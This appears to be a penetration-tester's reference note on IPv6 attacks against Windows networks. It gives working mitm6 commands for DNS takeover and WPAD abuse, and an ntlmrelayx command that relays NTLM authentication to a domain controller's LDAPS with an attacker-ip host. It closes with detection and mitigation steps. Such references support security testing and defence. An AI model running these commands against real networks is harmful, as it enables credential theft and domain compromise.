---
tags:
  - "#type/technique"
  - "#tactic/TA0001"
  - "#stage/initial-access"
  - "#os/windows"
  - "#protocol/ipv6"
  - "#tool/mitm6"
  - "#tool/ntlmrelayx"
  - privileges/unauthenticated
aliases:
  - IPv6 Attacks
  - DHCPv6 Spoofing
  - DNS Takeover via IPv6
  - WPAD Abuse
---

## Technique
___
IPv6 attacks exploit Windows' preference for IPv6 over IPv4 and common IPv6 misconfigurations in enterprise networks. Attackers can intercept and manipulate network traffic, leading to credential theft and domain compromise.

## Prerequisites
___

**Access Level:** Network access to the target network.

**System State:** IPv6 must be enabled (default in Windows).

**Information:** Ability to send router advertisements and respond to neighbor solicitations.

## Execution
___

### mitm6 DNS Takeover
```bash
# Basic usage
mitm6 -d example.com -i eth0

# With WPAD attack
mitm6 -d example.com -i eth0 --wpad
```

### NTLM Relay with mitm6
```bash
# Start mitm6 in one terminal
mitm6 -d example.com -i eth0

# In another terminal, start ntlmrelayx
ntlmrelayx.py -6 -t ldaps://DOMAIN_CONTROLLER -wh attacker-ip -l loot/
```

## Detection & Mitigation
___

### Detection
- Monitor for unexpected IPv6 traffic
- Look for rogue router advertisements
- Watch for unexpected DNS queries/responses

### Mitigation
- Disable IPv6 if not needed
- Implement RA Guard on network devices
- Configure DHCPv6 Guard
- Disable LLMNR and NetBIOS-NS
- Enable SMB Signing
___